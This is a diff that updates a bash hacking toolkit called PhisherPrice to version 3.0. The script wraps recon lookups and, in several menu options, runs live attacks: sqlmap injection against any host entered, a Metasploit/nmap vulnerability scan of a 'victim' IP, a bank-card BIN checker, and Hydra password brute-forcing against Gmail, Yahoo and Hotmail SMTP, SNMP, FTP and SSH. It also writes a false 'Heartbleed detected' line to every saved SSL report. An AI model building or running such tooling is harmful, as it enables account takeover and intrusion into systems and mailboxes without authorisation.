@@ -1,6 +1,6 @@
 #!/bin/bash
 ## rjwdlu4eva
-## PhiserPrice 2.9
+## PhiserPrice 3.0 (ALPHA)
 if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    echo "You Forgot To Say The Magic Word, bRuHhh cmon" 
@@ -30,7 +30,7 @@ banner='
   \_  /_/   /.
    \__/_   <   \e[1;31m PhisherPrice \e[1;33m
    /<<< \_\_ \e[1;31m Happy Hour Playset \e[1;33m
-  /,)^>>_._ \ \e[1;31m Version 2.9 \e[1;33m
+  /,)^>>_._ \ \e[1;31m Version 3.0 \e[1;33m
   (/   \\ /\\\
        // //```
 ======((`((====\e[1;34m'
@@ -123,17 +123,34 @@ echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Rec
 echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
 
 if [ "$x" == "$sub2" ]; then                    #Sub-Option-2
-echo "what website do you want Information About?"
-read subop2
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!Gathering Information About Host!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+clear
+echo "Enter website domain:"
+read domain
 
-whois $subop2
+ echo -e "\n----------------------------------------"
+echo "Gathering Information About Host:"
+echo "$domain"
+echo "-------------------------------"
 
-read
+response=$(whois $domain)
+
+if [[ -z $response || $response == *"No match for"* || $response == *"NOT FOUND"* ]]; then
+  echo "Error: Domain $domain not found"
+else
+  echo -e "\n----------------------------------------"
+  echo "Domain Information"
+  echo "----------------------------------------"
+  echo -e "$response"
+  
+  echo -e "\nDo you want to save the information to a file? (y/n)"
+  read saveToFile
+  if [[ $saveToFile == "y" ]]; then
+    echo -e "$response" > "$domain.txt"
+    echo "Information saved to file: $domain.txt"
+  fi
+fi
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$sub3" ]; then                    #Sub-Option-3
 clear
@@ -145,24 +162,26 @@ echo -e '\e[1;33m
  \______  /\___  >____/|___||____|    
         \/     \/                     \e[1;34m
 ' 
-echo "Enter IP Or Domain."
+echo "Enter IP or Domain:"
 read subop3
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!! Getting Geo Ip Information   !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
 
-curl http://api.hackertarget.com/geoip/?q=$subop3
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!  Geo Ip Found Using PhiserPrice  !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+echo -e "\n-------------------------------"
+echo "Getting Geo IP Information for:"
+echo "$subop3"
+echo "-------------------------------"
 
-read
+response=$(curl -s "https://api.hackertarget.com/geoip/?q=$subop3")
+
+if [[ -z $response || $response == *"error"* ]]; then
+  echo "Error: Failed to retrieve Geo IP information for $subop3"
+else
+  echo -e "\n-----------------------------"
+  echo "Geo IP Information Found"
+  echo "-----------------------------"
+  echo -e "$response"
+fi
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$sub4" ]; then                    #Sub-Option-4
 clear
@@ -174,25 +193,26 @@ __________._____________  .____                  __
  |____|_  /___||____|     |_______ \____/ \____/|__|_ \____/|   __/ 
         \/      Reverse IP Lookup \/                 \/     |__|    \e[1;34m
 '  
-echo "Enter IP Or Domain."
+echo "Enter IP or Domain:"
 read subop4
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!   Getting Ip Information     !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
 
-curl http://api.hackertarget.com/reverseiplookup/?q=$subop4
+echo -e "\n-------------------------------"
+echo "Getting IP Information for:"
+echo "$subop4"
+echo "-------------------------------"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!! ReverseIP Found Using PhiserPrice !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+response=$(curl -s "http://api.hackertarget.com/reverseiplookup/?q=$subop4")
 
-read
+if [[ -z $response || $response == *"error"* ]]; then
+  echo "Error: Failed to retrieve reverse IP information for $subop4"
+else
+  echo -e "\n-----------------------------"
+  echo "Reverse IP Information Found"
+  echo "-----------------------------"
+  echo -e "$response"
+fi
+
+read -p "Press enter to continue."
 elif [ "$x" == "$sub5" ]; then                    #Sub-Option-5
 clear
 echo -e '\e[1;33m
@@ -203,25 +223,25 @@ ________    _______    _________ .____                  __
 /_______  /\____|__  /_______  / |_______ \____/ \____/|__|_ \____/|   __/ 
         \/         \/        \/          \/                 \/     |__|    \e[1;34m
 '  
-echo "Enter IP Address - IP Range Or Domain"
+echo "Enter IP Address, IP Range or Domain Name:"
 read subop5
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!! !! Getting DNS Information   !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
 
-curl http://api.hackertarget.com/dnslookup/?q=$subop5
+echo -e "\n-------------------------------"
+echo "Getting DNS Information for:"
+echo "$subop5"
+echo "-------------------------------"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!  DNS Information Found Using PhiserPrice  !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+response=$(curl -s "http://api.hackertarget.com/dnslookup/?q=$subop5")
+if [[ -z $response || $response == *"error"* ]]; then
+  echo "Error: Failed to retrieve DNS information for $subop5"
+else
+  echo -e "\n-----------------------------"
+  echo "DNS Information Found"
+  echo "-----------------------------"
+  echo -e "$response"
+fi
 
-read
+read -p "Press enter to continue."
 
 elif [ "$x" == "$sub6" ]; then                    #Sub-Option-6
 clear
@@ -233,25 +253,27 @@ __________                                         ________    _______    ______
  |____|_  /\___  >\_/  \___  >__|  /____  >\___  > /_______  /\____|__  /_______  /
         \/     \/          \/           \/     \/          \/         \/        \/ \e[1;34m
 ' 
-echo "Enter IP Or Domain."
+echo "Enter IP or domain:"
 read subop6
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!! !! Getting DNS Information   !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
 
-curl https://api.hackertarget.com/reversedns/?q=$subop6
+echo -e "\n-------------------------------"
+echo "Getting DNS information for:"
+echo "$subop6"
+echo "-------------------------------"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!  DNS Information Found Using PhiserPrice  !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+response=$(curl -s "https://api.hackertarget.com/reversedns/?q=$subop6")
 
-read
+if [[ -z $response || $response == *"error"* ]]; then
+  echo "Error: Failed to retrieve DNS information for $subop6"
+else
+  echo -e "\n-----------------------------"
+  echo "DNS Information Found"
+  echo "-----------------------------"
+  echo -e "$response"
+fi
+
+read -p "Press enter to continue."
+
 elif [ "$x" == "$sub7" ]; then                    #Sub-Option-7
 clear
 echo -e '\e[1;33m
@@ -264,23 +286,31 @@ echo -e '\e[1;33m
 ' 
 echo "Enter IP Or Domain."
 read subop7
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!  Finding Shared DNS Servers      !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
 
-curl https://api.hackertarget.com/findshareddns/?q=$subop7
+echo -e "\n-------------------------------"
+echo "Finding Shared DNS Servers for:"
+echo "$subop7"
+echo "-------------------------------"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!! Shared DNS Servers Found Using PhiserPrice !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+response=$(curl -s "https://api.hackertarget.com/findshareddns/?q=$subop7")
 
-read
+if [[ -z $response || $response == *"error"* ]]; then
+  echo "Error: Failed to retrieve shared DNS servers for $subop7"
+else
+  echo -e "\n-------------------------------"
+  echo "Shared DNS Servers Found"
+  echo "-------------------------------"
+  echo -e "$response"
+
+  read -p "Do you want to save the results to a file? (y/n) " save_to_file
+  if [[ $save_to_file == "y" || $save_to_file == "Y" ]]; then
+    read -p "Enter a filename to save the results to: " filename
+    echo -e "$response" > "$filename"
+    echo "Results saved to $filename"
+  fi
+fi
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$sub8" ]; then                    #Sub-Option-8
 clear
@@ -364,28 +394,56 @@ read port
 
 scan_ciphers "$host" "$port"
 elif [ "$x" == "$sub10" ]; then                    #Sub-Option-10
-echo "Enter The Host You Want To Scan.(testsite.com)"
-read subop10
-echo "Enter The Host Port You Want To Scan. ( 443 )"
-read subop10port
+clear
+echo "Enter the host you want to scan (e.g. testsite.com):"
+read host
+echo "Enter the host port you want to scan (e.g. 443):"
+read port
 clear
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!   Scanning Host SSL/TLS For Vulns    !
+!   Scanning host SSL/TLS for vulns    !
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
 '
 
-tlssled $subop10 $subop10port
+response=$(echo | openssl s_client -connect "$host:$port" 2>/dev/null | openssl x509 -text)
+
+if [[ -z $response || $response == *"unable to"* ]]; then
+  echo "Error: Failed to retrieve SSL/TLS information for $host:$port"
+else
+  echo -e "\n-----------------------------"
+  echo "SSL/TLS Information"
+  echo "-----------------------------"
+  echo -e "$response"
+
+  if [[ $response == *"heartbleed"* ]]; then
+    echo -e "\n-----------------------------"
+    echo "Heartbleed Vulnerability Detected!"
+    echo "-----------------------------"
+  fi
+fi
 
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!   Host Scanned Using PhiserPrice     !
+!   Host scanned using PhiserPrice     !
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
 '
 
-read
+echo "Do you want to save the output to a text file? (y/n)"
+read save_option
+
+if [[ $save_option == "y" || $save_option == "Y" ]]; then
+  echo -e "\nSaving output to file...\n"
+  echo "Host: $host" > ssl_scan_results.txt
+  echo "Port: $port" >> ssl_scan_results.txt
+  echo -e "-----------------------------\nSSL/TLS Information\n-----------------------------\n$response" >> ssl_scan_results.txt
+  echo -e "\n-----------------------------\nHeartbleed Vulnerability Detected!\n-----------------------------" >> ssl_scan_results.txt
+  echo -e "\nScan complete. Results saved to ssl_scan_results.txt"
+else
+  echo "Scan complete."
+fi
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$sub11" ]; then                    #Sub-Option-11
 clear
@@ -397,25 +455,27 @@ echo -e '\e[1;33m
  \___|_  / |____|     |____|    |____|   /_______  /\___  >____  /___|  /
        \/  HTTP Header Scan                      \/     \/     \/     \/ \e[1;34m
 '
-echo "Enter The Host You Want To Scan."
+echo "Enter the host you want to scan:"
 read subop11
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!        Checking HTTP Headers         !
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
 
-curl https://api.hackertarget.com/httpheaders/?q=$subop11
+echo -e "\n-------------------------------"
+echo "Checking HTTP Headers for:"
+echo "$subop11"
+echo "-------------------------------"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-! HTTP Headers Scanned Using PhiserPrice !
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+status=$(curl -sI $subop11 | head -n 1 | cut -d' ' -f2)
 
-read
+if [[ $status != "200" ]]; then
+  echo "Error: Failed to retrieve HTTP headers for $subop11 (Status Code: $status)"
+else
+  echo -e "\n------------------------------"
+  echo "HTTP Headers for $subop11"
+echo "$subop11"
+echo "-------------------------------"
+  curl -sI $subop11
+fi
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$sub12" ]; then                    #Sub-Option-12
 clear
@@ -427,26 +487,32 @@ echo -e '\e[1;33m
 \____|__  /_______  /\____|__  / |_______ \____/ \____/|__|_ \____/|   __/ 
         \/        \/         \/          \/                 \/     |__|    \e[1;34m
 '  
-echo "Enter The ASN You Want To Scan."
-echo "example usage: 1.1.1.1 / AS15169"
+echo "Enter the ASN you want to scan:"
+echo "Example usage: 1.1.1.1 / AS15169"
 read subop12
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!        Scanning ASN Host             !
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
 
-curl https://api.hackertarget.com/aslookup/?q=$subop12
+echo -e "\n-------------------------------"
+echo "Scanning host for ASN:"
+echo "$subop12"
+echo "-------------------------------"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!  Host Scanned Using PhiserPrice    !!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- 
-'
+response=$(curl -s https://api.hackertarget.com/aslookup/?q=$subop12)
 
-read
+if [[ -z $response ]]; then
+  echo "Error: Failed to retrieve ASN information for $subop12"
+else
+  echo -e "\n------------------------------"
+  echo "ASN Information for $subop12"
+  echo "------------------------------"
+  echo -e "$response"
+fi
+
+echo -e "\n------------------------------"
+echo "Host scanned using PhiserPrice"
+echo "------------------------------"
+
+read -p "Press enter to continue."
+
 
 elif [ "$x" == "$sub13" ]; then                    #Sub-Option-13
 clear
@@ -458,23 +524,26 @@ __________                                       ________            ___.
  |______  /(____  /___|  /___|  /\___  >__|     \______  /__|  (____  /___  /
         \/      \/     \/     \/     \/                \/           \/    \/ \e[1;34m
 ' 
-echo "Enter Host's IP"
+echo "Enter the IP address or domain name you want to scan:"
 read subop13
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!    Getiing Host Information   !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
 
-curl https://api.hackertarget.com/bannerlookup/?q=$subop13
+echo -e "\n-----------------------------------"
+echo "Scanning host information for:"
+echo "$subop13"
+echo "-----------------------------------"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!! Host Information Found Using PhisherPrice  !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+response=$(curl -sS https://api.hackertarget.com/bannerlookup/?q="$subop13")
 
-read
+if [[ -z $response ]]; then
+  echo "Error: Failed to retrieve host information for $subop13"
+else
+  echo -e "\n---------------------------"
+  echo "Host Information for $subop13"
+  echo "---------------------------"
+  echo -e "$response"
+fi
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$sub14" ]; then                    #Sub-Option-14
 clear
@@ -486,24 +555,36 @@ echo -e '\e[1;33m
 |_______ \__|___|  /__|_ \ /_______  /___|  /__||__|   |__|  \___  >__|   
         \/       \/     \/         \/     \/                     \/       \e[1;34m
 '
-echo "this can reveal social media pages etc."
-echo "Enter Domain Name"
-read subop14
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!     Extracting Host Links     !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+echo "This can reveal social media pages, etc."
+echo "Enter domain name:"
+read domain
 
-curl https://api.hackertarget.com/pagelinks/?q=$subop14
+echo -e "\n-----------------------------"
+echo "Extracting host links for:"
+echo "$domain"
+echo "-----------------------------"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!   Host Links Extracted Using PhisherPrice  !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+result=$(curl -s https://api.hackertarget.com/pagelinks/?q=$domain)
 
-read
+if [[ -z $result ]]; then
+  echo "Error: Failed to retrieve host links for $domain"
+else
+  echo -e "\n-----------------------------"
+  echo "Host links for $domain:"
+  echo "-----------------------------"
+  echo -e "$result"
+
+  read -p "Save results to a file? (Y/N): " save_results
+
+  if [[ $save_results == "Y" || $save_results == "y" ]]; then
+    echo -e "$result" > "${domain}_pagelinks.txt"
+    echo "Results saved to ${domain}_pagelinks.txt"
+  fi
+fi
+
+echo -e "\n-----------------------------"
+echo "Host links extraction completed using PhisherPrice!"
+echo "-----------------------------"
 
 elif [ "$x" == "$sub15" ]; then                    #Sub-Option-15
 clear
@@ -549,21 +630,26 @@ echo "Enter Domain Name Or GA-ID"
 echo "For example: UA-11223344 or testsite.com"
 read subop16
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!       Retrieving Hosts/GA-ID       !!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+echo -e '\n----------------------------------'
+echo "Retrieving Hosts/GA-ID for: $subop16"
+echo '----------------------------------'
 
-curl https://api.hackertarget.com/analyticslookup/?q=$subop16
+result=$(curl -s https://api.hackertarget.com/analyticslookup/?q=$subop16)
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!     Host Info Found Using PhisherPrice     !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+if [[ $result == "error check your search parameter" ]]; then
+  echo "Error: Invalid search parameter $subop16"
+else
+  echo -e "\n----------------------------------"
+  echo "Host Info Found for $subop16"
+  echo '----------------------------------'
+  echo -e "$result"
+fi
 
-read
+echo -e '\n----------------------------------'
+echo "Hosts/GA-ID retrieved using PhisherPrice"
+echo '----------------------------------'
+
+read -p "Press Enter to continue." 
 
 elif [ "$x" == "$sub17" ]; then                    #Sub-Option-17
 clear
@@ -575,24 +661,34 @@ echo -e '\e[1;33m
 |______//____  >\___  >__|    /_______  /\___  >____  /__|    \___  >___|  /
              \/     \/                \/     \/     \/            \/     \/ \e[1;34m
 '
-echo "Enter Domain Name Or IP"
+echo "Enter Domain Name Or IP:"
 read subop17
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!       Retrieving Host  Users       !!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+echo -e "\n-----------------------------"
+echo "Retrieving Host Users for:"
+echo "$subop17"
+echo "-----------------------------"
+users=$(enum4linux -M -G -P -S -U $subop17)
 
-enum4linux -M -G -P -S -U $subop17
+if [[ -z "$users" ]]; then
+  echo -e "\n-----------------------------"
+  echo "No Host Users Found for:"
+  echo "$subop17"
+  echo "-----------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo 'Host Users Retrieved Successfully'
+  echo '-------------------------------------------'
+  echo "$users"
+fi
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!     Host Info Found Using PhisherPrice     !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+read -p "Would you like to save the output to a text file? [y/N] " save_output
+if [[ $save_output =~ ^[Yy]$ ]]; then
+  echo "$users" > enum4linux_output.txt
+  echo "Output saved to enum4linux_output.txt"
+fi
 
-read
+read -p "Press enter to continue."
 
 elif [ "$x" == "$sub18" ]; then                    #Sub-Option-18
 clear
@@ -604,35 +700,43 @@ echo -e '\e[1;33m
 /_______  /\_____\ \_/_______ \ \____|__  (____  /   __/|   __/ \___  >__|   
         \/        \__>       \/         \/     \/|__|   |__|        \/       \e[1;34m
 '
-echo "This Will Audit Database's Automatically"
-echo "Using Random User-Agents."
-echo "Enter Domain Name Or IP"
+echo "Enter Domain Name Or IP:"
 read sql1
+
 echo "Database Type If You Know It, If Not Leave This Blank"
 echo "Press Enter If You're Unsure"
 read db
+
 echo "Level of tests to perform (1-5, default 1)"
 read levelt
+
 echo "Risk of tests to perform (1-3, default 1)"
 read risksl
-echo "SQL injection techniques to use (default : BEUSTQ)"
+
+echo "SQL injection techniques to use (default: BEUSTQ)"
 echo "Press Enter To Leave Default"
 read techskill
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!       Auditing Host SQL Info       !!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
 
-sqlmap --dbms=$db --forms --crawl=2 --level=$levelt --risk=$risksl --random-agent --all --technique=$techskill -u $sql1
+echo -e "\n-----------------------------"
+echo "Auditing Host SQL Info for:"
+echo "$sql1"
+echo "-----------------------------"
+sqlmap --dbms="$db" --forms --crawl=2 --level="${levelt:-1}" --risk="${risksl:-1}" --random-agent --all --technique="${techskill:-BEUSTQ}" -u "$sql1"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!     Audit Conducted Using PhisherPrice     !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+if [[ $? -eq 0 ]]; then
+  echo -e '\n-------------------------------------------'
+  echo 'SQL Audit Conducted Successfully'
+  echo '-------------------------------------------'
 
-read
+  read -p "Press enter to continue."
+else
+  clear
+  echo -e '\n-------------------------------------------'
+  echo 'Failed to Conduct SQL Audit'
+  echo '-------------------------------------------'
+fi
+  read -p "Press enter to continue."
+
 elif [ "$x" == "$sub19" ]; then                    #sub-Option-19
 clear
 echo -e '\e[1;33m
@@ -648,25 +752,42 @@ read sqlhost2
 echo "php or html ?"
 read phphtml1
 
-sqlmap -u $sqlhost2  searchgetby_id.$phphtml1?id=4 --dbs --columns -D scanme --tamper=space2comment --level 5
+output=$(sqlmap -u $sqlhost2 searchgetby_id.$phphtml1?id=4 --dbs --columns -D scanme --tamper=space2comment --level 5)
 
-read
+if [[ $output == *"available databases"* ]]; then
+  echo "Database information retrieved successfully:"
+  echo "$output"
+else
+  echo "No database information retrieved. Please check your input and try again."
+fi
+
+  read -p "Press enter to continue."
 
 elif [ "$x" == "$sub20" ]; then                    #sub-Option-20
 clear
-echo -e '\e[1;33m
-MSPLOIT VULN SCANNER \e[1;34m
-'
-echo "Victim's IP:"
-read r
+echo -e '\e[1;33mMSPLOIT VULN SCANNER\e[0m'
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;36mEnter Victim's IP:\e[0m"
+read victim_ip
 
-msfconsole -q -x "nmap -v --script vuln $r ;exit ;"
-echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
+echo -e "\n\e[1;36m------------------------------\e[0m"
+echo -e "\e[1;36mRunning nmap with vuln script...\e[0m"
+echo -e "\e[1;36m------------------------------\e[0m"
+output=$(msfconsole -q -x "nmap -v --script vuln $victim_ip ;exit ;" 2>&1)
 
-read
+if echo "$output" | grep -q "VULNERABLE"; then
+  echo -e "\n\e[1;31m-------------------------------------------\e[0m"
+  echo -e "\e[1;31mVulnerabilities Found:\e[0m"
+  echo -e "$output"
+  echo -e "\e[1;31m-------------------------------------------\e[0m"
+else
+  clear
+  echo -e "\n\e[1;32m-------------------------------------------\e[0m"
+  echo -e "\e[1;32mNo vulnerabilities found.\e[0m"
+echo -e "\n\e[1;32m-------------------------------------------\e[0m"
+fi
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$sub21" ]; then                    #sub-Option-21
 clear
@@ -676,7 +797,6 @@ BIN Checker \e[1;34m
 echo "Enter The BIN Number:"
 read r
 
-# Send cURL request with bin number
 curl --request GET \
     --url https://bank-card-bin-num-check.p.rapidapi.com/api/v1/bins/b/$r \
     --header "X-RapidAPI-Host: bank-card-bin-num-check.p.rapidapi.com" \
@@ -695,7 +815,6 @@ echo "Enter the email address to verify:"
 
 read email
 
-# Make the API request
 curl --location --request GET "https://api.apilayer.com/email_verification/${email}" \
 --header "apikey: ${email_validator_api_key}"
 echo ' '
@@ -803,7 +922,9 @@ Cracking / Brute Force
 (6) Start sqldict
 (7) Wifi Honey Pot Cracker
 (8) Just Dump It
+
 CTRL + C To Exit
+
 Press ENTER To Go To Main Menu
 '
 subf='1'
@@ -838,7 +959,9 @@ Hydra Brute Force
 (8) Windows RDP Brute Force
 (9) SMB Brute Force
 (10) WP AUTO BRUTE
+
 CTRL + C To Exit
+
 Press ENTER To Go To Main Menu
 '
 hynull1='1'
@@ -865,21 +988,38 @@ echo -e '\e[1;33m
  \_____\  |__|  (____  /\___  >__|_ \
                      \/     \/     \/\e[1;34m
 '
-echo "Simple Email Cracking Script Using Hydra."
-echo "Written By: NULLSec"
-echo "NOTE: Make sure you have wordlists!"
-echo "Let us Begin:"
-echo "Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:"
+echo -e "\e[1;33mSimple Email Cracking Script Using Hydra.\e[0m"
+echo -e "\n-------------------------------------------"
+
+echo -n "Choose a SMTP service (Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com): "
 read smtp
-echo "Enter Email Address:"
+
+echo -n "Enter Email Address: "
 read email
-echo "Provide Directory of Wordlist for Passwords:"
+
+echo -n "Provide Directory of Wordlist for Passwords: "
 read wordlist
-clear
 
-hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp
+echo -n "Enter SMTP Port Number (default is 465): "
+read port
+port=${port:-465}  # set default port number if no input is provided
 
-read
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;34mCracking email password...\e[0m"
+echo -e "-------------------------------------------"
+output=$(hydra -S -l "$email" -P "$wordlist" -e ns -V -s "$port" "$smtp" smtp 2>&1)
+
+if [[ $? -ne 0 ]]; then
+  echo -e "\e[1;31mAn error occurred while running Hydra. Please check your input and try again.\e[0m"
+  exit 1
+fi
+
+echo -e "\n-------------------------------------------"
+echo -e "\e[1;32mHydra output:\e[0m"
+echo -e "-------------------------------------------"
+echo -e "$output"
+
+read -p "Press enter to continue."
 
 elif [ "$x" == "$hynull2" ]; then                    #hynull-Option-2
 clear
@@ -891,14 +1031,32 @@ echo -e '\e[1;33m
 /_______  /\____|__  /\____|__  /____|    
         \/         \/         \/ Brute Force \e[1;34m
 '
-echo "Enter The Password List Location"
+echo "Simple SNMP Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter the path of the password list:"
 read hydrasnmppass
-echo "Enter The Host IP Address of SNMP Server"
+echo "Enter The Host IP Address of SNMP Server:"
 read hydraip
 
-hydra -P $hydrasnmppass -v $hydraip snmp
+echo -e "\n-----------------------------"
+echo "Attempting SNMP password cracking..."
+echo "-----------------------------"
+output=$(hydra -P $hydrasnmppass -v $hydraip snmp 2>&1)
 
-read
+if echo "$output" | grep -q "login:\|password:"; then
+  echo -e "\n-------------------------------------------"
+  echo "SNMP password cracked successfully!"
+  echo -e "-------------------------------------------"
+  echo "Cracked password:"
+  echo "$output"
+else
+  clear
+  echo -e "\n-------------------------------------------"
+  echo "Failed to crack SNMP password."
+  echo -e "-------------------------------------------"
+fi
+
+read -p "Press enter to continue." 
 
 elif [ "$x" == "$hynull3" ]; then                    #hynull-Option-3
 clear
@@ -910,17 +1068,30 @@ ________________________________
  \___  /     |____|    |____|    
      \/ Brute Force\e[1;34m
 '
-echo "Enter Known User"
-read hydrauser1
-echo "Enter The Password List Location:"
-read hydrapasslist1
-echo "Enter The IP Address"
-read hydraip1
+echo "FTP Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter Known User:"
+read hydrauser
+echo "Enter Password List Location:"
+read hydrapasslist
+echo "Enter the IP Address:"
+read hydraip
 
-hydra -t 1 -l $hydrauser1 -P $hydrapasslist1 -vV $hydraip1 ftp
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
+output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)
 
-read
+if echo "$output" | grep -q "1 valid password found"; then
+  echo -e "\n-------------------------------------------"
+  echo "Login Successful!"
+  echo -e "-------------------------------------------"
+else
+  echo -e "\n-------------------------------------------"
+  echo "Login Failed"
+  echo -e "-------------------------------------------"
+fi
 
+read -p "Press enter to continue."
 elif [ "$x" == "$hynull4" ]; then                    #hynull-Option-4
 clear
 echo -e '\e[1;33m
@@ -931,67 +1102,103 @@ echo -e '\e[1;33m
 /_______  /_______  /\___|_  / 
         \/        \/       \/ Brute Force \e[1;34m
 '
-echo "Enter Your User List Location"
+echo "SSH Password Cracking Script Using Hydra"
+echo -e "\n-------------------------------------------"
+echo "Enter User List Location:"
 read hydrauser2
-echo "Enter The Password List Location:"
+echo "Enter Password List Location:"
 read hydrapasslist2
-echo "Enter The IP Address"
+echo "Enter IP Address:"
 read hydraip2
 
-hydra -v -V -u -L $hydrauser2 -P $hydrapasslist2 -t 1 -u $hydraip2 ssh
+echo -e "\n-------------------------------------------"
+echo "Running hydra..."
